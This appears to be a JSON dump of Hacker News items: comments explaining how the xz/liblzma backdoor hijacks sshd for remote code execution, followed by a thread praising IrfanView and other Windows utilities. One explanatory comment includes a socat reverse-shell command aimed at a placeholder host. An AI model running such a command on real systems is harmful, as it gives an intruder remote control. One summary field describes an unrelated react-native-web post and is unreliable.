themselves. If we relied on gadget vendors to maintain such software, I think we can just look at any IoT or router manufacturer to get an idea of just how often and for how long they will update the software. So that idea will probably backfire spectacularly if implemented. reply BlueFalconHD 10 hours agorootparentWhat does the IME or PSP do? reply timschmidt 10 hours agorootparentShort answer: anything it wants. IME has privileged access to the MMU(s), all system memory, and even out-of-band access to the network adapter such the the OS cannot inspect network traffic originating with or destined for the IME. reply CobrastanJorji 4 hours agorootparentprevLots. It's basically an extra processor that runs at all times, even when your computer is supposedly \"off.\" Its firmware is bigger than you'd think, like a complete Unix system big. It's frankly terrifying how powerful and opaque it is. It provides a lot around remote management for corporations, lots of \"update the BIOS remotely\" sort of features, and also a bunch of those stupid copy protection enforcement things. Plus some startup/shutdown stuff like Secure Boot. reply berkes 11 hours agorootparentprevWhy would \"embed software in chips\" be a solution? If anything, I'd expect it to be an even bigger risk, because when (not if) a security issue is found in the hardware, you now have no way to fix it, other than throwing out this server/fridge/toothbrush or whatever is running it. reply heresWaldo 10 hours agorootparentA flashable secure enclave segment in the hardware stack is an option to patch around embedded bugs. I haven’t worked in hardware design since the era of Nortel, and it was way different back then but the general physics are the same; if, else, while, and math operations in the hardware are not hard. In fact your hardware is a general while loop; while has power, iterate around refreshing these memory states with these computed values, even in the absence of user input (which at the root is turning it on). Programmers have grown accustomed to being necessary to running ignorant business machines but that’s never been a real requirement. Just a socialized one. And such memes are dying off. reply WesolyKubeczek 11 hours agorootparentprevWhich will make updates either expensive or impossible. You will be able to write books about exploitable bugs in the hardware, and those books will easily survive several editions. reply saagarjha 4 hours agorootparentprevIt’s not that we can’t understand it, it’s just that work to understand it is ongoing. reply q3k 11 hours agoparentprev> The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? Surely if we can reverse the code we can write a PoC? Not if public-key cryptography was used correctly, and if there are no exploitable bugs. reply jnwatson 9 hours agorootparentWe understand it completely. However, since determining the private key that corresponds to the public key embedded in the backdoor is practically infeasible, we can't actually exercise it. Someone could modify the code with a known ed448 private key and exercise it, but the point of having the PoC is to scan the internet and find vulnerable servers. reply junon 10 hours agoparentprevSiblings saying \"we don't know\" haven't really groked the post I don't think. If I'm understanding the thread correctly, here's a (not so) succinct explanation. Please, if you know better than I do, correct me if I've made an error in my understanding. `system()` is a standard C function that takes a string as input and runs it through `sh`, like so: sh -c \"whatever input\" It's used as a super rudimentary way to run arbitrary shell commands from a C program, using the `execl()` call under the hood, just like you'd run them on a bash/sh/fish/zsh/whatever command line. system(\"echo '!dlroW ,olleH'rev\"); Those commands run mostly in the same privilege context as the process that invoked `system()`. If the call to `system()` came from a program running as root, the executed command is also run as root. The backdoor utilizes this function in the code that gets injected into `sshd` by way of liblzma.so, a library for the LZMA compression algorithm (commonly associated with the `.xz` extension). Jia Tan, the person at the center of this whole back door, has been a maintainer of that project for several years now. Without going too much into how the injected code gets into the `sshd` process, the back door inserts itself into the symbol lookup process earlier than other libraries, such as libcrypto and openssl. What this means is (and I'm over-simplifying a lot), when the process needs to map usages of e.g. `SSL_decrypt_key()` that were linked to dynamic libraries (as opposed to be statically linked and thus included directly into `sshd`), to real functions, it does a string-wise lookup to see where it can find it. It runs through a list of dynamic libraries that might have it and sees if they export it. If they do, it gets the address of the exported function and remembers where it's at so that further calls to that function can be found quickly, without another search. This is how DLLs and SOs (dynamic libraries) are linked to the process that needs them at runtime without the process needing to know exactly where the functions that they need are located. The back door hijacks this mechanism to insert its own functions in some of those places, so that when `sshd` thinks it's calling `SSL_decrypt_key()`, it's really calling some malicious function in the back door - which can then choose to do something with the data passed to the function call, or it can choose to forward the call to the real function. It makes use of this when `sshd` needs to validate RSA information passed to the server via a client connection during authentication. An RSA key has a bunch of fields, one of which is the 'n' field - the public key data itself. OpenSSL implements this as a BIGNUM, or a variable-length, potentially very large number. It's more or less read in as a bag of bytes, and its meaning depends on the underlying encryption algorithm. This is the mechanism behind \"public key authentication\" when connecting to servers, and is generally more secure than e.g. username/password authentication. The back door intercepts the call to check the RSA data, pulls out the 'n' parameter, and tries to decrypt it using ChaCha20. There's no way for it to know if it's decrypted beforehand, but generally encryption algorithms have a way to error-check and report failures - that, or you add some well known piece of information into the encrypted data that you can verify once it's decrypted. Either way, the back door checks to see if it's really an encrypted string. If not, it forwards the call back to the original RSA check mechanism so that sshd can process it normally. However, if the decryption succeeds, the back door passes the decrypted string to `system()`. This means that a random client connecting to an SSH server can craft an RSA public key that is really an encrypted, malicious payload to run any arbitrary shell command under which the same user `sshd` is running - oftentimes root. Not only that, but the back door also checks the incoming RSA structure to see if it's coming from the person who made it. This prevents any of us finding this exploit and using it ourselves, even if we know our target is infected. It's a completely exclusive back door to whomever holds the private key used by the back door to sort of 'authenticate' the exploit itself. This is much worse than what many of us thought it was before - a public key auth bypass - which would have meant that you'd only gain access to any user allowed to log in via SSH. SSH's configuration file has a setting that disables root logins under any circumstances that is generally enabled on production systems for obvious reasons. However, with it being an RCE, SSH servers running as root would execute the payloads as root. From there, they could easily run socat and have the system connect to a server of their choice to gain a remote interactive shell, for example: socat TCP:example.com:1234 SYSTEM:\"bash -l\" The possibilities are really endless. They'd effectively have a skeleton key that only they could use (or sell) that, with enough time for people to upgrade their version of `sshd`, would allow them access to just about any SSH server they could connect to, oftentimes with root permissions. Hope that explains it a bit. reply Denvercoder9 8 hours agorootparent> Siblings saying \"we don't know\" haven't really groked the post I don't think. The reason for saying \"we don't know\" is not that we don't understand what's detailed in TFA, but that the backdoor embeds a 88 kB object file into liblzma, and nobody has fully reverse engineered and understood all that code yet. There might be other things lurking in there. reply takeda 2 hours agorootparentprev> They'd effectively have a skeleton key that only they could use (or sell) that this looks more like state sponsored attack and it doesn't look like someone joining and at one point realizing they want to implement this backdoor. The guy joined the project 2 years ago, developed a test framework (which he then used to hide binary of the backdoor in which appears that is complex and others are still figuring out how it works) then he gradually disabled various security checks before activating it. reply sureglymop 4 hours agorootparentprevThank you for the detailed write up. This made me think, why do we actually let sshd run as root? Would it be possible to only run a very unsophisticated ssh server as root that depending on the user specified in the incoming connection just coordinates that connection to the actual user and let the server run there? This could be so simplistic that a backdoor would more easily be detected. reply skywhopper 11 hours agoparentprevFrom what I’ve read I think the attack vector is: 1. sshd starts and loads the libsystemd library which loads the XZ library which contains the hack 2. The XZ library injects its own versions of functions in openssl that verify RSA signatures 3. When someone logs into SSH and presents a signed SSH certificate as authentication, those hacked functions are called 4. The certificate, in turn, can contain arbitrary data that in a normal login process would include assertions about username or role that would be used to determine if the certificate is valid for use logging in as the particular user. But if the hacked functions detect that the certificate was signed by a specific attacker key, they take some subfield of the certificate and execute it as a command on the system in the sshd context (ie, as the root user). Unfortunately, we don’t know the attacker’s signing key, just the public key the hacked code uses to validate it. But basically this would give the attacker a way to run any command as root on any compromised system without leaving much of a trace, beyond the (presumably failed) login attempt, which any system on the internet will be getting a lot of anyway. reply xinayder 53 minutes agorootparent> When someone logs into SSH and presents a signed SSH certificate as authentication, those hacked functions are called So if I only use pubkey auth and ED25519, there's no risk? Besides this, just to understand it better, if someone tries to login to your server with the attacker's certificate, the backdoor will disable any checks for it and allow the remote user to login as root (or any other arbitrary user) even if root login is disabled in sshd config? reply skywhopper 24 minutes agorootparentI don’t think we know enough to be sure even disabling certificate auth would prevent this. But from what I can tell it probably wouldn’t directly allow arbitrary user login. It only seems to allow the execution of an arbitrary command. But of course that command might do something that would break any other security on the system. But, one clever thing about this attack is that the commands being run wouldn’t be caught by typical user-login tracking, since there’s no “login”. The attacker is just tricking sshd into running a command. reply ghostpepper 11 hours agorootparentprev> beyond the (presumably failed) login attempt There is some evidence it's scrubbing logs so we might not even have that. reply Deathcrow 3 hours agorootparentIs there really a failed login attempts? If it never calls the real functions of ssh in case of their own cert+payload why would sshd log anything or even register a login attempt? Or does the backdoor function hook in after sshd already logged stuff? reply skywhopper 18 minutes agorootparentI think it would depend on logging level, yeah. I’ve not seen one way or another whether it aborts the login process or prevents logging, but that’s possible, and would obviously be a good idea. Then the question would be if you could detect the difference between a vulnerability-aborted login attempt and just a malformed/interrupted login attempt. But in the case of this specific attack, probably the safest approach would be to watch and track what processes are being spawned by sshd. Which in retrospect is probably advisable for any network daemon. (Of course, lots of them will be sloppy and messy with how they interact with the system and it might be next to impossible to tell attacks from “legit” behavior. But sshd is probably easier to pin down to what’s “safe” or not. reply numpad0 3 hours agorootparentprevDepending on log level, isn't there going to be lines up to receiving the payload? reply ajross 11 hours agoparentprev> The OP makes it sound like an attacker can send a malicious payload in the pre-auth phase of an SSH session - but why does he say that an exploit might never be available? The exploit as shipped is a binary (cleverly hidden in the test data), not source. And it validates the payload vs. a private key that isn't known to the public. Only the attacker can exercise the exploit currently, making it impossible to scan for (well, absent second order effects like performance, which is how it was discovered). reply 367 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The post delves into expanding the react-native-web reset stylesheet to style web apps, covering CSS rules for elements, themes, autofill, date/time inputs, text links, and Tooltips.",
      "It highlights a security analysis of an xz backdoor and its risks, stressing the necessity of JavaScript for interactive web apps."
    ],
    "commentSummary": [
      "A backdoor vulnerability in XZ and OpenSSH software enables remote code execution as root via SSH servers, employing encryption and obfuscation, complicating detection.",
      "Mitigation strategies like SELinux, sandboxing, and sshd process reconfiguration are suggested to reduce risks.",
      "The conversation highlights difficulties in securing SSH logins, addressing potential supply chain attacks, and the gap in cybersecurity expertise between attackers and defenders, emphasizing continuous monitoring, code analysis, and behavioral scanning for safeguarding critical security systems."
    ],
    "points": 1030,
    "commentCount": 618,
    "retryCount": 0,
    "time": 1711822758
  },
  {
    "id": 39874931,
    "title": "IrfanView: Fast, Compact, and Free Graphic Viewer Software",
    "originLink": "https://www.irfanview.com/",
    "originBody": "Menu Version 4.66 Home Send Us an Email Other Mirrors Select Mirror Germany 1 Germany 2 Germany 3 Italy Poland Portuguese Russia Privacy Policy Download IrfanView 32-bit IrfanView 64-bit Languages Plugins Skins Screenshot About What is IrfanView? History of Changes Nice www Links About the Author Support-Donate Faq Forum One of the Most Popular Viewers Worldwide IrfanView graphic viewer Fast and compact ( just 6 MB ) Freeware for non-commercial use Supports Windows XP, Vista, 7, 8, 10 and 11 32 and 64 bit version Multi language support Unicode support Designed to be simple but powerful More information about IrfanView I would like to sincerely thank all you faithful IrfanView users who send me messages of good wishes, congratulations and appreciation. THANKS ! Irfan Skiljan. About the Author Get IrfanView (version 4.66) The program is available in 32 and 64 bit. Which version should I download? See 64-bit info. 32-BIT DOWNLOAD Current version 4.66 PLUGINS 64-BIT DOWNLOAD Current version 4.66 PLUGINS Other download sites Donate / Support / Register IrfanView Useful Partner Sites Stempelservice: www.stempelservice.de Lunacy, free design software: icons8.com/lunacy Top 5 UI/UX design agencies: Clay UI/UX design Branding services for startups: Ramotion Looking for IrfanView as Windows 10 App? (MS App Store) 32-bit App 64-bit App A Load of Features View Images Convert Optimize Scan & Print Create Slideshow Batch Processing Multimedia And many more Copyright © 1996-2023 by Irfan Skiljan. All Rights Reserved. Hosted by domainunion. design by Playmain.",
    "commentLink": "https://news.ycombinator.com/item?id=39874931",
    "commentBody": "IrfanView (irfanview.com)408 points by omnibrain 20 hours agohidepastfavorite249 comments knighthack 15 hours agoI've been using IrfanView since at least 1997, if not earlier in 1996. I still use IrfanView to this day. It's my Swiss knife for a lot of simple photo editing work (cropping, resizing, padding, text-adding, etc), batch-processing, and for browsing single photos through directories. It's not just good, it's way faster than the bloated alternatives. To top it off, IrfanView works beautifully on my Linux via Wine, and also on my Mac M1/M2 machines (and as a tool quicker than even Mac's own Preview). It's a primary install for me, whichever any platform I'm working on; and a software that's truly a gift to the world. reply nolok 14 hours agoparentYou want to open a picture, FAST, no matter the format or resolution ? You want to open a picture and then move from one picture to the next in the same folder with arrow keys or mouse scroll, again fast and without loading or menus fonctions or whatever ? You want to batch process a folder to convert all files to png with the larger side limited to 2000px, keep the location data but reset the orientation data, and remove the original file only if conversion succeeded ? You want to scan something, rotate it and lossy pixelize an area ? You want to resize, convert, re-encode a picture from one format to another with tonnes of option without resorting to command line because you're on windows and you would like to just do it in the same app you use for every photo thing ? You want to cut a part of a picture, or identify the pixel color on a picture, or dozens or other every day operations like that ? You want all of that to be absurdly fast, aka instant, without any complex menu or dozens of clicks to get where you need ? I've been using irfanview since the beginning too, and it's not for lack of trying other stuff, it's just so much better. It's for me one of those tools, like Everything or Ditto or SumatraPDF or 7zip or NAPS2 or ... That just get what they are and what they should provide, and do just that, and do it right. reply akoboldfrying 22 minutes agorootparentEverything is the best program I have ever used. I couldn't live without it at this point. It would be like cutting off both arms. reply jhalstead 12 hours agorootparentprevDo you have a link for Ditto? Searching for \"Ditto app\" and \"Ditto software\" returns several possible results for me (e.g. clipboard, music app, managing \"copy\", content sharing). reply elrostelperien 12 hours agorootparentThe most famous is the clipboard one (https://ditto-cp.sourceforge.io/). I'd be surprised if they were referring to another \"Ditto\" software. reply nolok 12 hours agorootparentYou are correct, this is the one I meant. It claims to handle windows clipboard \"shortcomings\" by remember previous entries and allowing you to access it easily (allowing for multi copy paste situation), and it does just that and do it well. reply smusamashah 9 hours agorootparentBTW windows now ship with a clipboard tool like this using Windows + V shortcut. I use other tools you mentioned already though. Need to try ditto. Is there a list of similarly *fast* alternatives like this for windows (+other OSes)? reply nolongerthere 8 hours agorootparentIdk if this is still the case but back when I tried the built in clipboard history when it was first released, it didn’t handle formatted text well, nor did it handle multi-media particularly well, if at all. One of the best parts about ditto is that you can choose to paste with or without formatting reply anjel 6 hours agorootparentThe are indeed many clipboard managers across all platforms, but none have the perfect UI of ditto. Its ditto's UI that needs to be copied everywhere else. reply tauio111 3 hours agorootparentHaven't used Ditto before but I use CopyQ on Linux, at least according to the screenshots of Ditto it appears that CopyQ has been influenced by it reply Ringz 3 hours agorootparentMaccy on MacOS is perfect: https://maccy.app/ reply nolongerthere 2 hours agorootparentI use maccy on my wife’s Mac and don’t love it, maybe it’s bec I’m still not comfortable with Mac keyboard shortcuts or maybe it’s just the UI, but there’s something about it that feels less baked than ditto. reply Ringz 49 minutes agorootparentI don’t know ditto but on maccy it’s just the paste shortcut (for the last copy) plus a number (if you need an older copy). Could it be easier? reply sunshinesnacks 7 hours agorootparentprevThe Windows clipboard history tool works with images. Screenshots, at least, but I think others as well. reply onehair 7 hours agorootparentprevI use sumatra for how lightweight and fast it is. 7zip is just uncontested. I wish Ditto had copycats on linux and macos. It's just sublime. I've never used irfanview though, I'm too quick to judge from the UI of an app xD I see all those buttons on IrfanView and how it opens as an explorer of pictures rather than just a simple Photo Viewer with arrows to go back and forth and closed it. qView is my fav right now. It does exactly what I need from a viewer. It views. I rarely need editing. Nowadays if I need editing I just open Photopea. If I need batch editing/converting I open XnConvert. tl;dr IfranView is probably amazing, but just like all those buttons on np++ I pre-judge and find simpler things reply chipotle_coyote 7 hours agorootparentI haven't used Ditto so I don't know how closely macOS clipboard managers compare to it, but there's certainly a fair number of programs for the Mac out there that sound similar to Ditto's own description, from the free, open source Maccy to the somewhat over-the-top $13 Pastebot. There are other utility programs that include similar functionality; personally, I'm using Alfred, a keyboard-driven launcher, which also includes a pretty good clipboard manager (and is the sort of app that I'd be looking for copycats for on Linux if I ever made the switch back!). https://maccy.app https://tapbots.com/pastebot/ https://www.alfredapp.com reply 1vuio0pswjnm7 12 hours agoparentprev\"It's not just good, it's way faster than the bloated alternatives.\" Another shining endorsement of \"modern\" software development (no, check that... software \"engineering\") Before I gave up Windows permanently, and that was over 20 years ago, I used this program. The more things \"change\" the more they stay the same. reply Xeoncross 10 hours agorootparentSounds like IrfanView just needs more PM's and VC's reply metadat 8 hours agorootparentprevIs IRFan Windows-only? Looks like it, too bad, this would be amazing to have on Linux. reply therealmarv 13 minutes agorootparentI used Gwenview back in the days in Linux. I think it's still great. reply Ruthalas 2 hours agorootparentprevIf you didn't happen to see it, this is from knighthack's comment above: \"To top it off, IrfanView works beautifully on my Linux via Wine, and also on my Mac M1/M2 machines (and as a tool quicker than even Mac's own Preview). It's a primary install for me, whichever any platform I'm working on; and a software that's truly a gift to the world.\" reply jsmith99 52 minutes agoparentprev> It's not just good, it's way faster than the bloated alternatives. I use Faststone, what am I missing? reply dean2432 3 hours agoparentprevFor MacOS, I wonder if it's faster than XNView MP. This was the fastest image viewer I could find for Apple Silicon. Also are you running it through Wine on MacOS or how do you get it working? reply therealmarv 26 minutes agorootparentEver tried Phoenix Slides (open source, long history)? It's definitely faster than Preview for me on large images: https://blyt.net/phxslides/ reply zerkten 14 hours agoparentprevHow do you get it on macOS? reply vrinsd 14 hours agorootparentIf it's for non-commercial use, you might find this a spritual equivalent, cross-platform: https://www.xnview.com/en/xnviewmp/ reply KronisLV 13 hours agorootparentCan vouch that this is a nice piece of software, especially the batch convert options (everything from EXIF data, rescaling images and various other transformations, as well as either replacing the original files or various naming options) and supports a bunch of formats. reply justin66 10 hours agorootparentprevThis comment is baffling. Just so you know, the IrfanView license requires commercial users to pay for a license, just like XnView does. Apparently that's... bad? reply therealmarv 7 minutes agorootparentalso allowed in commercial settings (BSD style license): Phoenix Slides https://blyt.net/phxslides/ open-source, ignore the simple web page, software is awesome. reply dewey 55 minutes agorootparentprevHow did the comment in any way make it sound bad? reply vrinsd 5 hours agorootparentprevI didn't remember what the IrfanView license was/is but IrfanView is not cross-platform which is what I was responding to with an alternative. reply millzlane 14 hours agorootparentprevThey're doing it via Wine. reply darreninthenet 11 hours agoparentprevIs there a Mac version or do you run it on Mac under Wine/Crossover? reply movetheworld 7 minutes agoprevI personally like \"FSViewer\" way more. It's customizable, portable and free. It was my favorite software, which was replaced by \"XYPlorer\", which is a fileExplorer alternative. FSViewer link: https://www.faststone.org/FSViewerDetail.htm XYPlorer link: https://www.xyplorer.com/ reply donatj 15 hours agoprevThat’s a name I have not heard in a long while. I used to use it back on Windows 95 because it was a faster way to view JPEGs than opening Internet Explorer. Everything about that makes me feel old. reply Semaphor 15 hours agoparentStill a part of the standard software I install on every new install. reply cellularmitosis 14 hours agorootparentAs an only occasional windows user, I certainly wouldn’t mind seeing such a list, maybe in a GitHub gist if you find yourself bored one day :) reply nolok 11 hours agorootparentEach their own, that's mine. Note that this is not a tech user or developper list, but the list of what I install on any new windows pc, including those at work etc ... 7zip (open any archive) VLC (open any audio/video file) IrfanView (+ the \"all plugins\" installer on the same page, open any picture file) SumatraPDF (read PDFs) Libreoffice (to open any office files) NAPS2 (easy scan, and split/merge/... PDFs) Ditto (give your clipboard a memory) Everything (an instant file search that works) TeraCopy (replace windows copy with queue, queues, add files to the queue instead of starting a second parallel copy, pause that works, ...) Powertoys (so many to list ... mass rename file easily, screen ruler, text extractor ...) If it's appropriate : Qbittorent (clean torrent client) Nvidia graphic card ? NVCleaninstall, so you can install just the clean driver you need Windows 10 or 11 ? O&O Shut Up (to disable all the telemetry and onedrive in one click, there are plenty alternatives but I sort of like this one) Windows 11 ? ExplorerPatcher to remove suggestions in the start menu and the new and terrible castrated contextual menu And of course your browser of choice and extensions In ten minutes you have a computer that feels much more smart and usable. There are plenty of great software out there, but I feel like many what to install lists are very topical or include software you won't use in many cases or once every 6 months, so this is my short list of what you will use essentially every time you use the computer. reply albert_e 2 hours agorootparentadding mine TreeSize (to easily find out what is consuming disk space) picpick/ shareX (screenshotting with annotationsand autosave) pdftk (pdf merge, split, crop, interleave( ffmpeg (video trim, split, re-encode, etc.) Lossless cut (GUI for ffmpeg trim and extract/add tracks) OpenShot video editor (when DaVinci Resolve is too much for the job and you need simple edits and effects) OBS Studio (screen record, stream to youtube) reply jjbinx007 1 hour agorootparentWiztree is a good alternative to Tree size, it's almost instantaneous reply mrWiz 10 hours agorootparentprevI recently started having trouble with 7zip at work due to shared sharepoint folders and the like. I wound up finding ZanaZip which was forked from 7zip but keeps up with modern OS changes. reply nrdvana 6 hours agorootparentprevNot using windows much anymore, but great to hear about O&O and ExplorerPatcher. I notice you don't list an ssh client. I still install cygwin for that. Anything new besides putty? reply nolok 15 minutes agorootparentSSH client is not for non tech users and I tried to keep my list non tech oriented, something you can install on yours, your mom or Janice from accounting and they will all benefit from it. For SSH I was a die hard team PuTTy for a long time but these days one of the first thing I install on my windows computer is WSL and a Debian inside, that covers all my SSH needs. reply lmz 3 hours agorootparentprevWindows now has OpenSSH https://learn.microsoft.com/en-us/windows-server/administrat... reply denzil 3 hours agorootparentprevWindows now have OpenSSH client (and server) available as optional features. Together with the new terminal the ssh client seems to be working fine. Personally I usually opt in to use the ssh in WSL as I keep it installed on all my Windows machines. reply t0bia_s 4 hours agorootparentprevPowerShell. Is there anything that putty do better? reply anjel 6 hours agorootparentprevYou only left out Bulk Renamed Utility https://www.bulkrenameutility.co.uk There are many like it but none finer. reply cobalt 7 hours agorootparentprevSome alternatives to these items: I like bandizip for zip needs MPC-BE for video/audio XnViewMP Firefox for PDFs MS office web (no need to install anything) Windows 10+ includes clipboard history PowerToys does have a file search, not sure how it compares to Everything reply salesynerd 8 hours agorootparentprevThanks for sharing your list; I already use many of them but learnt about a few new ones that I'll try. I second Everything, the best, nifty little, Windows search utility that is blazing fast. reply anjel 6 hours agorootparentI find everything is more than just file search. It often works super well as a stand alone file manager. reply aragonite 4 hours agorootparentprevA worthy competitor to vlc is potplayer reply Semaphor 2 hours agorootparentprevThis is my list, but it’s pretty opinionated and is missing some pieces: Backblaze Backupper, Canon CaptureOnTouch, YNAB CLassic, and GPSoft’s Directory Opus https://gist.github.com/Christoph-Wagner/c26ee84105edd12b4d3... reply throwup238 13 hours agorootparentprevNot the OP but I use a subset of the software available on https://ninite.com/ (IrfanView included) reply Semaphor 13 hours agorootparentUsed to use that as well, but the selection was too limited for me, so I first switched to chocolatey, and nowadays, winget. This way I can install almost everything I want with one command. I'll post my list tomorrow when I'm back on my PC. reply 101008 15 hours agoparentprevI opened the link first and I kept a few seconds trying to remember what we had to use to open JPEGs and GIFs back then. Then I read your comment. Right, IE for images. What a fun world we lived on! reply integricho 14 hours agorootparentACDSee 2.4 and 3.1 were similarly legendary and fast in both startup time and overall performance of image loading. reply therealmarv 16 minutes agorootparentAlso remember the times... I think ACDsee 2.3.x was a game changer on Windows systems with little memory back in the day... it was so fast and displayed partially on the fly. Btw I use a Mac nowadays and I get strong ACDsee vibes from open-source Phoenix Slides https://blyt.net/phxslides/ with browsing through images with the mouse-wheel ;) reply omnibrain 13 hours agorootparentprevWhen ACDsee got bloated (and the shareware screen to nagging) I switched to IrfanView. reply bitwize 15 hours agoparentprevEverybody was down with either IrfanView or ACDSee to look at their collection of uudecoded por--er, photographic human figure studies they got off USENET. reply AlienRobot 15 hours agoparentprev>I used to use it back on Windows 95 because it was a faster way to view JPEGs than opening Internet Explorer. That's an amazing sentence. We should frame it and put it in a museum. Actually someone should make a book filled just with quotes like this, call it \"Life Before the Gigahertz\" or something. reply necubi 15 hours agorootparentI see so many comments these days bemoaning how slow modern software has gotten, but no one seems to remember/have been alive for the time when just rendering an image would take multiple seconds. Just goes to show that our expectations scale with the available technology. reply muxator 13 hours agorootparentAnd now decoding a jpeg takes the blink of an eye, but we wait five seconds for a widget to render. When it does, we click somewhere else, because in that exact moment the layout was reflown. reply bdhcuidbebe 3 hours agorootparentprevi remember watching images download and how relevant progressive rendering was. blurry shapes! reply Terr_ 12 hours agorootparentprevNews quotes followed by a link to an audio file that discloses its length and probable (larger) time to download. reply therealmarv 31 minutes agoprevIf somebody searching a good native Mac alternative I strongly recommend this fast open source image viewer (ignore the simple web page, software is great!): Phoenix Slides https://blyt.net/phxslides/ It replaced the (abandoneware) Xee3 on my system. reply baobabKoodaa 12 hours agoprevIrfanView is great, but I'm curious, why is it on top of HN today of all days? Was there something significant happening? reply thomond 9 hours agoparentThere a post earlier regarding paint.net and people there mentioned irfanview. reply huytersd 11 hours agoparentprevIt happens every now and then. Could be as simple as nostalgia. reply fuzztester 10 hours agorootparentLike Delphi, FreePascal and Lazarus, though less often for those three than for IrfanView, and those three get a good number of sneers by modern ignoramuses, each time. The joke is on them, due to the amount of late night and weekend work (unpaid, often) that many of them have to pull, and tamely accept and try to justify, to save their egos and paychecks. \"The emperor has no clothes\" kind of thing ... And nowadays, layoffs, too ... reply nrdvana 6 hours agorootparentDelphi kicked ass. Though, looking back, it didn't have hash tables at your fingertips like modern languages. I really can't imagine writing code without hashmaps anymore. Did that ever get added, and in a convenient way that doesn't require declaring a new object each time? reply nurettin 2 hours agorootparentYou could use TDictionary. It has been around since 15 years. reply meristohm 19 hours agoprevBack when i used Windows, IrfanView was my go-to image viewer, downloaded along with SumatraPDF via ninite.com. There's something similar in the repositories in Software Manager on Linux Mint, and Pix is fuller-featured, but like Foobar2000 for music, I still miss IrfanView from time to time, probably because of muscle memory and being more impressionable back then. (There's almostt certainly a way to get these Windows programs running on LMDE, I just don't care enough to mess with it.) reply dean2432 2 hours agoparentThere's a snap image of Foobar2000 for Linux which works very well :) My #1 music player. reply NelsonMinar 16 hours agoprev4MB to download the installer, back in the days when programs just did the thing they did and didn't include runtimes for entire virtual environments. reply Rinzler89 15 hours agoparentAn average PC also had 64-256MB of RAM instead of 8-32GB. reply vitro 15 hours agorootparentI told my friend once: - \"I have 8MB of RAM\" - \"That's cool, imagine having 16...\" reply stevesimmons 11 hours agorootparentMy first computer had 3583 bytes of RAM... reply Squeeeez 10 hours agorootparentWere those 8-bit bytes? reply Minor49er 6 hours agorootparentIs there any other kind of byte? reply hawski 4 hours agorootparenthttps://en.wikipedia.org/wiki/Byte > The size of the byte has historically been hardware-dependent and no definitive standards existed that mandated the size. Sizes from 1 to 48 bits have been used.[4][5][6][7] The six-bit character code was an often-used implementation in early encoding systems, and computers using six-bit and nine-bit bytes were common in the 1960s. These systems often had memory words of 12, 18, 24, 30, 36, 48, or 60 bits, corresponding to 2, 3, 4, 5, 6, 8, or 10 six-bit bytes. In this era, bit groupings in the instruction stream were often referred to as syllables[a] or slab, before the term byte became common. > The modern de facto standard of eight bits, as documented in ISO/IEC 2382-1:1993, is a convenient power of two permitting the binary-encoded values 0 through 255 for one byte, as 2 to the power of 8 is 256.[8] The international standard IEC 80000-13 codified this common meaning. Many types of applications use information representable in eight or fewer bits and processor designers commonly optimize for this usage. The popularity of major commercial computing architectures has aided in the ubiquitous acceptance of the 8-bit byte.[9] Modern architectures typically use 32- or 64-bit words, built of four or eight bytes, respectively. [4] https://en.wikipedia.org/wiki/Byte#cite_note-Buchholz_1956_1... [5] https://en.wikipedia.org/wiki/Byte#cite_ref-Buchholz_1956_1_... [6] https://en.wikipedia.org/wiki/Byte#cite_note-Rao_1989-6 [7] https://en.wikipedia.org/wiki/Byte#cite_note-Tafel_1971-7 [8] https://en.wikipedia.org/wiki/Byte#cite_note-ISO_IEC_2382-1_... [9] https://en.wikipedia.org/wiki/Byte#cite_note-CHM_1964-10 reply AlienRobot 15 hours agoparentprevBut what if you want to display Full HD video in the image viewer from an URL? Wouldn't you need Electron for that? Also I was under the impression just the DLLs for all the image formats would be over 4 MB. I wonder how large is it uncompressed. reply boltzmann-brain 3 hours agorootparentThe Windows standard file open dialog allows you to paste a http(s) link in, which will be downloaded and opened from the Temp folder. This works with all applications that use that dialog. reply nolok 10 hours agorootparentprevFYI, Irfanview might not be able to pull it from an url, but it's playing ful hd video just fine although I wouldn't use it for that. reply AlienRobot 9 hours agorootparent>it plays full HD video WHAT? IN 4 MB??? WHAT??? That's amazing! reply pixelpoet 6 hours agorootparentI'm just at the Revision demoparty in Germany, you should see the audiovisual stuff people are doing in 4kb (yes, 4096 bytes)! Modern operating systems and especially web dev have made entire generations forget how powerful computers and software are / can be. reply anta40 15 hours agoprevIrfanView is one of my \"must to have apps\", going back to Win 98. For simple image editing (resizing, cropping etc) and batch processing, it's though to beat. Now I mostly work on macOS, and miss it. I guess XnView is close enough. reply Ylpertnodi 11 hours agoparentI love(d) infan view, but just got used to (a portable version of) Xnview. I keep going back to irfan, but again - as much as it is an amazing piece of software, Xn for me. reply WXLCKNO 14 hours agoparentprevSame, using it since 1998 (I was 9, 35 now). Any windows PC I use doesn't feel right without the irfanview logo somewhere. reply omnibrain 13 hours agoprevIrfanView has a nice feature where it can monitor a folder and always show the newest picture. I used that for a selfie-photo-station for my wedding. A little more details here: https://news.ycombinator.com/item?id=37219826 Another feature I use often ist to copy the current image to a preset location. I use that for quickly pre-sorting photos. reply grzeshru 14 hours agoprevIrfanView shouldn’t be seen as a relic just because it’s “old”. Software like IV, Opus/Far just highlight how inadequate the OS provided tools for common navigation/viewing patterns are. Anyone who breaks through the “the computer is a magical box and I don’t understand any of it” barrier needs to have a manual tossed at them that covers this software right away. Nevermind gdb/WinDbg. reply makeitdouble 23 minutes agoparentTBF current photo viewer for Win11 is decent, and cover the basics pretty well. I reinstalled IrfanView from sheer nostalgia, and while it's still a good program, it doesn't handle pinch/zoom gestures as well as the default app. Same for editing, where IV has more features, yet core stuff like handwriting smoothing isn't as good. The biggest difference between \"these days\" and now is IMHO the wide availability of other tools to do more advanced stuff. For instance I remember batch processing features and export features in IV that I used a lot, but nowadays I'd do it in Imagemagick or GIMP. There is less need for a swiss army knife when the specialized tools are right there any time you need them. reply respondo2134 16 hours agoprevirfanview for images, vlc for videos, foobar for audio - so much better than anything bundled with windows since forever reply pawelduda 16 hours agoparentNever could get into foobar... team winamp here reply theandrewbailey 8 hours agorootparentSame. If I'm listening to music with something other than Winamp (and the default Classic skin), I feel weird. reply poisonborz 11 hours agorootparentprevThat is long dead, try AIMP, it even supports Winamp dsp-s. reply melasadra 2 hours agoparentprevI am often disappointed by the lack of shortcuts and features in VLC compared to Potplayer. Just some of the few keyboard shortcuts in Potplayer I use regularly: \"\" to shift the subtitle sync by half a secondd \"shift-\" to adjust the audio sync by half a second \"[\" and \"]\" to set an A-B repeat of that awesome scene or soundtrack 